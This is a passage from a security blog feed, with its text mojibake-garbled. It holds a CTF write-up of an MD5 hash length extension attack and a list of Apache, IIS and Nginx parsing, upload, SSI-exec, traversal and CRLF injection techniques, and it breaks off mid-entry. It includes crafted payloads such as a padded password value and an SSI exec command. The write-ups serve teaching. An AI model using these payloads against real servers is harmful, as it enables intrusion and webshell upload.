title="åˆ†ç»„ä¸è¡¥ä½å°ç»“"></a>åˆ†ç»„ä¸è¡¥ä½å°ç»“</h4><p>å†æ›´è¿›ä¸€æ­¥çš„äº†è§£MD5ç®—æ³•å‰ï¼Œéœ€è¦æ›´åŠ æ·±åˆ»åœ°ç†è§£ä¸€ä¸‹åˆ†ç»„ä¸è¡¥ä½ï¼Œä¸ç„¶ç¨åçš„ç†è§£ä¼šéå¸¸å›°éš¾ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152432.png" alt="QQæˆªå›¾20210217152432"></p><h4 id="åŠ å¯†æµç¨‹"><a href="#åŠ å¯†æµç¨‹" class="headerlink" title="åŠ å¯†æµç¨‹"></a>åŠ å¯†æµç¨‹</h4><p>è¿™é‡Œæ”¾å¼ è‡ªå·±ç”»çš„åŠ å¯†æµç¨‹çš„å›¾</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152445.png" alt="QQæˆªå›¾20210217152445"></p><p>å­—ç¬¦ä¸²å…ˆåˆ†ç»„ï¼Œç„¶åç¬¬ä¸€ç»„ä¸åˆå§‹é“¾è¿›è¡Œå¤æ‚æ•°å­¦è¿ç®—å¾—åˆ°é“¾1.<br>æ³¨æ„ï¼Œè¿™é‡Œçš„åˆå§‹é“¾æ˜¯å›ºå®šçš„ï¼Œæ¯ä¸ªMD5è¿ç®—çš„åˆå§‹é“¾éƒ½æ˜¯å›ºå®šçš„ï¼Œå…¶å€¼å°±æ˜¯å›¾ä¸­æ‰€è®°å½•çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ— è®ºå¯¹ä»€ä¹ˆæ•°æ®è¿›è¡ŒMD5åŠ å¯†ï¼Œå…¶åˆå§‹é“¾éƒ½æ˜¯</p><p>0x67452301<br>0xefcdab89<br>0x98badcfe<br>0x10325476</p><p>okã€‚ç¬¬ä¸€ç»„æ•°æ®ä¸åˆå§‹é“¾è¿›è¡Œå¤æ‚è¿ç®—å¾—åˆ°é“¾1ï¼Œç„¶åé“¾1ä¸ç¬¬äºŒç»„æ•°æ®è¿›è¡Œå¤æ‚è¿ç®—å¾—åˆ°é“¾2ï¼Œå¦‚æ­¤å¾€å¤ï¼Œç›´åˆ°å€’æ•°ç¬¬äºŒæ¡é“¾ä¸æœ€åä¸€ç»„æ•°æ®è¿›è¡Œå¤æ‚è¿ç®—å¾—åˆ°æœ€åä¸€æ¡é“¾(é“¾final)</p><p>ç„¶åé“¾finalè¿›è¡Œé«˜ä½ä½è½¬æ¢å°±å¾—åˆ°æœ€ç»ˆhashï¼Œé‚£ä¹ˆä»€ä¹ˆæ˜¯é«˜ä½ä½è½¬æ¢ï¼Ÿ</p><p>å¦‚æœfinalé“¾æ˜¯</p><ol><li>A=0x20f4847a</li><li>B=0x42e6abf8</li><li>C=0xf9097423</li><li>D=0x51a8dad4</li></ol><p>é‚£ä¹ˆå…¶hashä¾¿æ˜¯ 7a84f420f8abe642237409f9d4daa851</p><h2 id="hashé•¿åº¦æ‰©å±•æ”»å‡»"><a href="#hashé•¿åº¦æ‰©å±•æ”»å‡»" class="headerlink" title="hashé•¿åº¦æ‰©å±•æ”»å‡»"></a>hashé•¿åº¦æ‰©å±•æ”»å‡»</h2><p>åŸºç¡€çŸ¥è¯†æŒæ¡äº†ï¼Œå°±å¼€å§‹äº†è§£è¿™ä¸ªé‡å¤´æˆäº†ã€‚</p><p>ä»¥ä¸€é“é¢˜ä¸ºåˆ‡å…¥ç‚¹ï¼ˆæ”¹äº†ä¸€ä¸‹å®éªŒå§çš„ä¸€é“é¢˜ï¼‰</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Your cookies don&#39;t match up! STOP HACKING THIS SITE. &lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">&#x2F;&#x2F;$secret&#x3D;&quot;XXXXXXXXXXXXXXX&quot;; This secret is 15 characters long for security!</span><br><span class="line">$username&#x3D;&quot;admin&quot;;</span><br><span class="line">$password &#x3D; $_POST[&quot;password&quot;];</span><br><span class="line">if($_POST[&quot;getmein&quot;] &#x3D;&#x3D;&#x3D; md5($secret . urldecode($username . $password)))&#123;</span><br><span class="line">    if(is_numeric(strpos($password,&quot;abc&quot;)))&#123;</span><br><span class="line">    echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">    die (&quot;The flag is &quot;. $flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo(&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">echo(md5($secret . urldecode($username . &quot;admin&quot;)));</span><br><span class="line">?&gt; 93a5e7bea9c040065617b1a62ffc3d72</span><br></pre></td></tr></table></figure><p>ä»ä¸­æˆ‘ä»¬å¯ä»¥å¾—çŸ¥secreté•¿åº¦æ˜¯15ï¼Œmd5($sercet.â€adminadminâ€)=93a5e7bea9c040065617b1a62ffc3d72<br>é¢˜ç›®çš„æ„æ€å¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬éœ€è¦ä¼ ä¸¤ä¸ªå‚æ•°getmeinå’Œpasswordä½¿å¾—<br>getmein=md5($secret.â€adminâ€.password),ä¸”passwordåŒ…å«abcå­—ç¬¦</p><p>é‚£ä¹ˆè¿™å°±æ˜¯hashé•¿åº¦æ‰©å±•æ”»å‡»ç»å…¸çš„ä½¿ç”¨å…¸ä¾‹ï¼Œå³:<br>çŸ¥é“salté•¿åº¦ï¼ˆè¿™é‡Œsecretå˜é‡çš„é•¿åº¦ï¼‰<br>çŸ¥é“ä¸€ç»„è¢«åŠ å¯†å­—ç¬¦ä¸²é•¿åº¦å°äº56çš„æ ·æœ¬ï¼ˆ md5($sercet.â€adminadminâ€) çš„å€¼ï¼‰<br>å³å¯çŸ¥é“æŸä¸ªå€¼ä¸saltä¸€èµ·è¢«MD5åŠ å¯†åçš„hash</p><p>é‚£è¿™ç§æ”»å‡»æ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿ<br>é¦–å…ˆæˆ‘ä»¬çŸ¥é“äº†ä¸€ç»„æ ·æœ¬ï¼Œå³ç­‰äºæˆ‘ä»¬çŸ¥é“äº†è¯¥æ ·æœ¬çš„finalé“¾ï¼ˆé«˜ä½ä½å˜æ¢ï¼‰ã€‚<br>åŒæ—¶æˆ‘ä»¬çŸ¥é“äº†salté•¿åº¦ï¼Œå³ç­‰äºæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºè¯¥åˆ†ç»„ã€‚<br>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬åˆæ„é€ å‡ºä¸€ä¸ªæ–°çš„åˆ†ç»„ï¼ŒåŒæ—¶å…¶ä¸Šä¸€ä¸ªç»„æ˜¯å·²çŸ¥æ ·æœ¬ï¼Œé‚£ä¹ˆä¸æ–°åˆ†ç»„è¿›è¡Œå¤æ‚è¿ç®—çš„å°±æ˜¯å·²çŸ¥æ ·æœ¬çš„finalé“¾ã€‚<br>å·²çŸ¥æ ·æœ¬çš„finalé“¾ï¼Œæ–°åˆ†ç»„çš„å¾…åŠ å¯†å­—ç¬¦ä¸²ï¼Œå³å¯é€šè¿‡å¤æ‚è¿ç®—ï¼Œé«˜ä½ä½å˜æ¢è·å¾—æœ€ç»ˆhashã€‚<br>æ•…æ–°åˆ†ç»„å¾…åŠ å¯†å­—ç¬¦ä¸²çš„hashå€¼æ˜¯å¯ä»¥é¢„æµ‹çš„ã€‚<br>è¿™ï¼Œå°±æ˜¯hashé•¿åº¦æ‰©å±•æ”»å‡»çš„åŸç†ã€‚<br>å¯èƒ½è¿˜æ˜¯äº‘é‡Œé›¾é‡Œçš„ï¼Œé‚£å°±çœ‹å¦‚ä½•è§£é¢˜å§ã€‚</p><p>å› ä¸ºå·²çŸ¥salté•¿åº¦ï¼Œé‚£ä¹ˆå¯ä»¥é¢„æµ‹ä¸€ä¸‹æ ·æœ¬çš„åˆ†ç»„çš„æƒ…å†µ<br>å› ä¸ºsalt+adminadminçš„é•¿åº¦æ˜¯25ï¼Œé‚£ä¹ˆå…¶bitå°±æ˜¯200ï¼Œè½¬æ¢ä¸º16è¿›åˆ¶å°±æ˜¯c8.<br>é‚£ä¹ˆå‡è®¾saltå­—ç¬¦å…¨ä¸ºxï¼ˆä»…ä»…æ˜¯ä¸ªå‡è®¾è€Œå·²ï¼Œåˆ«æƒ³å¤ªå¤šäº†ï¼‰ï¼Œè¯¥åˆ†ç»„çš„æƒ…å†µ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152508.png" alt="QQæˆªå›¾20210217152508"></p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¼ å‚<br>password=admin%80%00*30abc<br>å…¶ä¸­abcä»¥å‰çš„å­—ç¬¦ä¼šåœ¨è¢«MD5è¿ç®—çš„æ—¶å€™åˆ†é…åˆ°å‰ä¸€ä¸ªç»„ï¼Œç„¶åé€šè¿‡è¿ç®—è·å¾—é“¾1ï¼Œè¿™ä¸ªé“¾1å°±æ˜¯æˆ‘ä»¬å·²çŸ¥æ ·æœ¬çš„finalé“¾äº†ã€‚<br>ç„¶åæˆ‘ä»¬å°±å¯ä»¥é¢„çŸ¥ï¼Œè¿™ä¸ªfinalé“¾ä¸abcè¿›è¡Œå¤æ‚è¿ç®—ï¼Œé«˜ä½ä½å˜æ¢å¾—åˆ°çš„hashäº†ã€‚ç„¶åå†æŠŠè¿™ä¸ªhashèµ‹å€¼ç»™openmeinï¼Œè¿™ä¸ªé¢˜å°±åšå‡ºæ¥äº†ã€‚</p><p>å¥½çš„ï¼Œå¤§è‡´åŸç†å°±æ˜¯è¿™æ ·äº†ã€‚<br>è¿™æ—¶å€™å¯ä»¥è‡ªè¡Œå†™è„šæœ¬æ¥æ‰¾åˆ°æŸæ˜æ–‡å¯¹åº”çš„MD5å¯†æ–‡ï¼Œæˆ–è€…ä½¿ç”¨å·¥å…·:hashpump.</p><p>![</p><p>](<a href="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152515.png">https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217152515.png</a>)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‚è€ƒ: &lt;a href=&quot;https://www.freebuf.com/articles/database/151167.html&quot;&gt;https://www.freebuf.com/articles/database/151167.html&lt;/a&gt;&lt;br&gt;&lt;a href=</summary>
      
    
    
    
    
    <category term="æ‚ä¸ƒæ‚å…«çš„å®‰å…¨é—®é¢˜" scheme="http://const27.com/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>å¸¸è§ä¸­é—´ä»¶çš„æ”»å‡»æ–¹å¼</title>
    <link href="http://const27.com/2021/06/28/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
    <id>http://const27.com/2021/06/28/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</id>
    <published>2021-06-28T13:52:18.718Z</published>
    <updated>2021-06-28T13:46:47.143Z</updated>
    
    <content type="html"><![CDATA[<h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1><h3 id="apacheæ–‡ä»¶å¤šåç¼€åè§£ææ¼æ´"><a href="#apacheæ–‡ä»¶å¤šåç¼€åè§£ææ¼æ´" class="headerlink" title="apacheæ–‡ä»¶å¤šåç¼€åè§£ææ¼æ´"></a>apacheæ–‡ä»¶å¤šåç¼€åè§£ææ¼æ´</h3><p>ä¸å…¶è¯´è¿™æ˜¯ä¸€ä¸ªæ¼æ´ï¼Œä¸å¦‚è¯´è¿™æ˜¯ä¸€ä¸ªç‰¹æ€§ï¼Œå¾ˆå¤šç¨‹åºå‘˜ä¸çŸ¥é“è¿™ç§ç‰¹æ€§ï¼Œæ‰€ä»¥ä¼šå†™å‡ºæœ‰é—®é¢˜çš„ä»£ç ã€‚<br><strong>ç‰¹æ€§ï¼šå¤šåç¼€å(å…¨ç‰ˆæœ¬éƒ½æœ‰è¿™ä¸ªç‰¹æ€§ï¼‰</strong><br>apacheåœ¨è§£æä¸€ä¸ªæ–‡ä»¶çš„åç¼€åæ—¶ï¼Œæ˜¯ä»å³å¾€å·¦è§£æåç¼€åçš„ï¼Œå¦‚æœå³è¾¹çš„åç¼€åä¸è®¤è¯†ï¼Œå°±ä¼šç»§ç»­å‘å·¦è¯†åˆ«ï¼Œç›´åˆ°è¯†åˆ«åˆ°ä¸€ä¸ªè®¤è¯†çš„åç¼€åï¼Œä½†æ˜¯ä¸‡ä¸€éƒ½ä¸è®¤è¯†å‘¢?éƒ½ä¸è®¤è¯†çš„è¯é»˜è®¤æƒ…å†µä¸‹æ˜¯plain/textå¤„ç†ã€‚é‚£ä¹ˆapacheæ˜¯æ€ä¹ˆçŸ¥é“å“ªä¸ªåç¼€åå®ƒæ˜¯è®¤è¯†çš„å‘¢?ç­”æ¡ˆæ˜¯è®¤è¯†çš„åç¼€åä»¬éƒ½è¢«è®°å½•åˆ°ä¸€ä¸ªå«mime.typesçš„æ–‡ä»¶ä¸­äº†ã€‚è¿™ä¸ªæ–‡ä»¶å‘¢,Windowsæ”¾åœ¨confæ–‡ä»¶å¤¹é‡Œï¼Œlinuxæ”¾åœ¨/etc/mime.typesï¼ˆä¸ä¸€å®šåœ¨è¿™é‡Œï¼Œéœ€è¦è‡ªå·±æ‰¾æ‰¾ï¼‰,æ‰“å¼€åæ˜¯è¿™æ ·</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143402.png" alt="QQæˆªå›¾20210219143402"></p><p>å®šä¹‰äº†ä¸åŒçš„åç¼€ååº”è¯¥å‘æµè§ˆå™¨è¿”å›ä»€ä¹ˆæ ·çš„mimeæ ¼å¼ã€‚è¿™é‡Œè¦è¯´çš„æ˜¯æœ‰äº›æƒ…å†µä¸‹çš„mime.typesæ²¡æœ‰æä¾›å¯¹phpçš„è§£ææ–¹æ³•ï¼Œå¯¹phpçš„è§£æè§„åˆ™æ”¾åœ¨å¦ä¸€ä¸ªæ–‡ä»¶ï¼ŒWindowsä¸‹åœ¨/conf/extra/httpd-php.confã€‚Linuxä¹Ÿæœ‰è¿™ä¸ªæ–‡ä»¶åœ¨/etc/apache2/mods-enabled/php7.2.confï¼ˆæˆ–è€…å’ŒWindowsçš„è·¯å¾„ä¸€æ ·),æ‰“å¼€åæ˜¯è¿™æ ·çš„ï¼Œå®šä¹‰äº†æ–‡ä»¶åæ»¡è¶³ä»€ä¹ˆæ¡ä»¶(æ­£åˆ™è¡¨è¾¾å¼)æ‰ä¼šå°†ä»–ç»™phpå¤„ç†å™¨å¤„ç†,è€Œä¸”ï¼Œå¦‚æœä½ mime.typesé‡ŒåŒ¹é…åˆ°äº†phpåç¼€ï¼Œä½†è¿™ä¸ªå¤„ç†å™¨åŒ¹é…æ–‡ä»¶æ²¡æœ‰åŒ¹é…æˆåŠŸï¼Œä»–è¿˜æ˜¯ä¸ä¼šæŠŠphpæ–‡ä»¶è¿›è¡Œå¤„ç†</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143411.png" alt="QQæˆªå›¾20210219143411"></p><p>å¯ä»¥è¯•ä¸€è¯•ï¼Œç¡®å®æ˜¯è¿™æ ·çš„,apacheå¯¹è¿™ä¸ªæ–‡ä»¶ç¬¬ä¸€ä¸ªåŒ¹é…åˆ°çš„åç¼€åæ˜¯jpgï¼Œæ‰€ä»¥æŠŠå®ƒå½“ä½œå›¾ç‰‡å¤„ç†äº†ï¼Œè¿”å›äº†å›¾ç‰‡ç±»å‹çš„mimeå¤´ï¼Œæµè§ˆå™¨ä¹Ÿå°±æŠŠè¿™ä¸ªæ–‡ä»¶å½“ä½œå›¾ç‰‡å¤„ç†ï¼Œäºæ˜¯å‡ºç°äº†è¿™ç§æƒ…å†µ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143431.png" alt="QQæˆªå›¾20210219143431"></p><p>å½“ç„¶ï¼Œç”¨è¿™ç§å¤šåŸŸåç‰¹æ€§å»è§£æphpæ–‡ä»¶çš„è¯ï¼Œå°±éœ€è¦åœ¨ä¸Šæ–‡æåˆ°çš„æ–‡ä»¶é‡Œå»ä¿®æ”¹ä¿®æ”¹å“¦ã€‚</p><h3 id="apache-æ¢è¡Œç»•è¿‡"><a href="#apache-æ¢è¡Œç»•è¿‡" class="headerlink" title="apache æ¢è¡Œç»•è¿‡"></a>apache æ¢è¡Œç»•è¿‡</h3><p>2.4.0~2.4.29ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªè§£ææ¼æ´ï¼Œåœ¨è§£æPHPæ—¶ï¼Œ<code>1.php\x0A</code>å°†è¢«æŒ‰ç…§PHPåç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥ã€‚</p><h3 id="apache-ssiè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆåŸç†å’Œssiæ³¨å…¥ä¸€æ ·ï¼‰"><a href="#apache-ssiè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆåŸç†å’Œssiæ³¨å…¥ä¸€æ ·ï¼‰" class="headerlink" title="apache ssiè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆåŸç†å’Œssiæ³¨å…¥ä¸€æ ·ï¼‰"></a>apache ssiè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆåŸç†å’Œssiæ³¨å…¥ä¸€æ ·ï¼‰</h3><p>å¦‚æœæœåŠ¡å™¨å¼€å¯äº†ssiä¸cgiæ”¯æŒ,å³å¯ä¸Šä¼ shtmlæ–‡ä»¶å¹¶åœ¨shtmlæ–‡ä»¶ä¸­è¾“å…¥ssiæŒ‡ä»¤ &lt;!â€“#exec cmd=â€payloadâ€ â€“&gt;ï¼Œå¦‚ &lt;!â€“#exec cmd=â€lsâ€ â€“&gt; ,ç„¶åå†è®¿é—®è¿™ä¸ªæ–‡ä»¶å³å¯è·å¾—lsçš„ç»“æœ</p><h1 id="iis"><a href="#iis" class="headerlink" title="iis"></a>iis</h1><h3 id="å…³äº-çš„phpè§£ææ¼æ´-iis7-7-5è§£ææ¼æ´"><a href="#å…³äº-çš„phpè§£ææ¼æ´-iis7-7-5è§£ææ¼æ´" class="headerlink" title="å…³äº/çš„phpè§£ææ¼æ´(iis7/7.5è§£ææ¼æ´)"></a>å…³äº/çš„phpè§£ææ¼æ´(iis7/7.5è§£ææ¼æ´)</h3><p>é€‚ç”¨ç‰ˆæœ¬ iis7/7.5<br>å‰ææ¡ä»¶:<br>1.php.inié‡Œçš„cgi.fix_pathinfoè®¾ç½®ä¸º1,ä¸”ç»“åˆæ–¹å¼æ˜¯fast-cgi</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143527.png" alt="QQæˆªå›¾20210219143527"></p><p>2.å¼€å¯Fast-CGIè¿è¡Œæ¨¡å¼<br>ä½œç”¨: åœ¨è®¿é—®æŸä¸ªæ–‡ä»¶æ—¶ï¼Œåœ¨è·¯å¾„ååŠ  /<em>.php(è¿™é‡Œçš„</em>æŒ‡ä»»æ„å­—ç¬¦)ï¼Œå³å¯è®©æœåŠ¡å™¨æŠŠæŠŠè¯¥æ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æå¹¶è¿”å›<br>å¦‚å›¾æˆ‘åœ¨ä¸€ä¸ªtxtæ–‡ä»¶ä¸­å†™å…¥phpä»£ç ï¼Œè®©åè®¿é—®å®ƒæ—¶åœ¨è·¯å¾„æœ€ååŠ äº†/a.phpï¼Œå®ƒå°±è¢«è§£æä¸ºphpæ–‡ä»¶äº†</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143555.png" alt="QQæˆªå›¾20210219143555"></p><h3 id="PUTä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#PUTä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="PUTä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>PUTä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´</h3><p>1.é€‚ç”¨ç‰ˆæœ¬ iis6.0<br>2.å‰ææ¡ä»¶:æœåŠ¡å™¨å¼€å¯äº†webdavæœåŠ¡å¹¶ä¸”è®¾ç½®äº†å†™å…¥æƒé™</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143610.png" alt="QQæˆªå›¾20210219143610"></p><p>åŒæ—¶æ‰¾åˆ°è®¿é—®ç½‘ç«™çš„ç”¨æˆ·æ˜¯å“ªä¸ªå¹¶ç»™ä»–è¯»å–å’Œå†™å…¥æƒ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143648.png" alt="QQæˆªå›¾20210219143648"></p><p>3.æ¦‚è¿°ï¼šç”¨PUTæ–¹æ³•ä¸Šä¼ æ–‡ä»¶,å¹¶å°è¯•getshell</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143716.png" alt="QQæˆªå›¾20210219143716"></p><p>ä¸Šä¼ ,å¹¶ä¸”ç¡®å®ä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯å¤§å¤šæ•°æƒ…å†µä¸‹æ— æ³•ä¸Šä¼ phpç­‰è„šæœ¬æ–‡ä»¶</p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±ä¼šæƒ³åˆ°ç”¨moveæ–¹æ³•æ¥å°†txtæ–‡ä»¶è½¬åŒ–ä¸ºphpæ–‡ä»¶,ä½†ç›´æ¥moveå¾€å¾€æ˜¯ä¸è¡Œçš„ï¼Œè¦ç”¨åˆ°iis6.0è§£ææ¼æ´ï¼ŒæŠŠå®ƒå†™æˆshell.php;.txtå°±å¯ä»¥äº†getshelläº†</p><h3 id="iis6ç•¸å½¢è§£ææ¼æ´"><a href="#iis6ç•¸å½¢è§£ææ¼æ´" class="headerlink" title="iis6ç•¸å½¢è§£ææ¼æ´"></a>iis6ç•¸å½¢è§£ææ¼æ´</h3><p>iis6.0ç¯å¢ƒä¸‹ä¼šæŠŠæ–‡ä»¶ç•¸å½¢è§£æ: 1.åœ¨ä¸€ä¸ªæ–‡ä»¶åé¢åŠ ;.ä»»æ„åç¼€åï¼šå‡è®¾æœ‰ä¸ªæ–‡ä»¶æ˜¯a.phpï¼Œæˆ‘ä»¬æŠŠå®ƒæ”¹æˆa.php;a.txtï¼Œä»–è¿˜æ˜¯ä¼šè¢«è§£ææˆphpæ–‡ä»¶ä½†æ˜¯å› ä¸ºåç¼€åæ˜¯txtæ‰€ä»¥ä¼šç»•è¿‡ä¸€äº›é˜²æŠ¤<br>2.åœ¨ä¸€ä¸ªåä¸º *.php(å¦‚a.php)çš„æ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«è§£æä¸ºphp</p><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h3 id="â€˜-â€™å­—ç¬¦è§£ææ¼æ´ï¼ˆå’Œiis7-7-5æ¼æ´åˆ©ç”¨æ–¹æ³•ä¸€è‡´ï¼‰"><a href="#â€˜-â€™å­—ç¬¦è§£ææ¼æ´ï¼ˆå’Œiis7-7-5æ¼æ´åˆ©ç”¨æ–¹æ³•ä¸€è‡´ï¼‰" class="headerlink" title="â€˜/â€™å­—ç¬¦è§£ææ¼æ´ï¼ˆå’Œiis7/7.5æ¼æ´åˆ©ç”¨æ–¹æ³•ä¸€è‡´ï¼‰"></a>â€˜/â€™å­—ç¬¦è§£ææ¼æ´ï¼ˆå’Œiis7/7.5æ¼æ´åˆ©ç”¨æ–¹æ³•ä¸€è‡´ï¼‰</h3><p>url/xxx.gif/xx.phpä¼šè¢«è§£æä¸ºphpæ–‡ä»¶</p><p>å‰ææ¡ä»¶:cgi.fix_pathinfo=1</p><h3 id="ç›®å½•éå†å°æ´"><a href="#ç›®å½•éå†å°æ´" class="headerlink" title="ç›®å½•éå†å°æ´"></a>ç›®å½•éå†å°æ´</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143839.png" alt="QQæˆªå›¾20210219143839"></p><p>å‰ææ¡ä»¶: nginx-conf æŠŠè¿™ä¸ªé€‰é¡¹æ”¹ä¸ºonå³å¯</p><h3 id="ç›®å½•ç©¿è¶Š"><a href="#ç›®å½•ç©¿è¶Š" class="headerlink" title="ç›®å½•ç©¿è¶Š"></a>ç›®å½•ç©¿è¶Š</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219143859.png" alt="QQæˆªå›¾20210219143859"></p><p>å‰ææ¦‚è¦:è¦ç”¨åˆ°åˆ«åalias<br>ä½œç”¨: å½“è®¾ç½®åˆ«åæ—¶ï¼Œlocationåé¢çš„è·¯å¾„æ²¡æœ‰ç”¨/é—­åˆæ—¶ï¼Œå°±ä¼šå¼•èµ·è®¿é—® url/xx../æ—¶è¿”å›çš„ç›®å½•æ˜¯å½“å‰æ–‡ä»¶å¤¹çš„ä¸Šå±‚ç›®å½•<br>å¯è§è¿”å›çš„ç›®å½•æ˜¯ä¸Šå±‚ç›®å½•</p><h3 id="CRLFæ³¨å…¥"><a href="#CRLFæ³¨å…¥" class="headerlink" title="CRLFæ³¨å…¥"></a>CRLFæ³¨å…¥</h3><p>å‰ææ¡ä»¶ä¸äº§ç”ŸåŸå› :<br>1.éšç€ä¸šåŠ¡çš„å‘å±•ï¼Œæœ‰äº›ç½‘ç«™ä¼šæŠŠ<a href="http://xxx/">http://xxx</a> é‡å®šå‘ä¸º<a href="https://xxx/">https://xxx</a>æˆ–<a href="http://x.com/">http://x.com</a>é‡å®šå‘ä¸º<a href="http://www.x.com/">http://www.x.com</a>,<br>é‚£ä¹ˆè¿™ç§é‡å®šå‘çš„åŸç†åœ¨nginxä¸Šçš„å®ç°æ–¹å¼æ˜¯åœ¨locationå—é‡ŒåŠ å…¥return 302 http://$host:81$uri;ä¹‹ç±»çš„è¯­å¥ï¼Œ<br>è¿™é‡Œçš„$host,$urléƒ½æ˜¯å˜é‡ã€‚$hostä¸€èˆ¬ä¸ºè¯·æ±‚å¤´çš„hostå¤´éƒ¨,$urlä¸€èˆ¬ä¸ºè¯·æ±‚è¡Œé‡Œçš„è·¯å¾„éƒ¨åˆ† å¦‚ GET /url HTTP/1.1æ­¤å¤„çš„/urléƒ¨åˆ†. 2.httpå¤´éƒ¨é‡Œï¼Œ0dï¼ˆcrï¼‰å’Œ0aï¼ˆlfï¼‰å­—ç¬¦æ˜¯ç”¨æ¥åˆ†å‰²è¯·æ±‚å¤´éƒ¨åŒºåŸŸçš„å­—ç¬¦ã€‚å¤´éƒ¨çš„è¡Œæ˜¯ä»¥ä¸€ä¸ªcrlfæ¥åˆ†å‰²çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¯·æ±‚å¤´éƒ¨æ¯ä¸ªè¡Œä¹‹é—´éƒ½å­˜åœ¨ç€ä¸€ä¸ªcrlfå­—ç¬¦æ¥åˆ†å‰²å®ƒä»¬ï¼Œè®©ä»–ä»¬æˆä¸ºå¤šä¸ªç‹¬ç«‹çš„è¡Œã€‚å¤´éƒ¨ä¸bodyä¹‹é—´æœ‰ä¸¤ä¸ªcrlfæ¥åˆ†å‰²<br>ä½œç”¨:å½“æŸå°nginxè®¾ç½®äº†å½¢å¦‚return 302 http://$host:80$uri; è¿™ç§é…ç½®æ—¶ï¼Œurlæ˜¯æˆ‘ä»¬å®Œå…¨å¯æ§çš„ï¼Œæ‰€ä»¥å¯ä»¥åœ¨urlä¸­äººä¸ºæ„é€ crlfå­—ç¬¦æ¥å®ç°åˆ†è¡Œï¼Œä»è€Œåœ¨å“åº”å¤´ä¸­æ³¨å…¥æˆ‘ä»¬æƒ³è¦å¾—åˆ°çš„å“åº”å¤´éƒ¨ã€‚<br><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219144020.png" alt="QQæˆªå›¾20210219144020"></p><h3 id="Nginx-æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰"><a href="#Nginx-æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰" class="headerlink" title="Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰"></a>Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰</h3><p>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7<br>url/xxxxx.gif%20 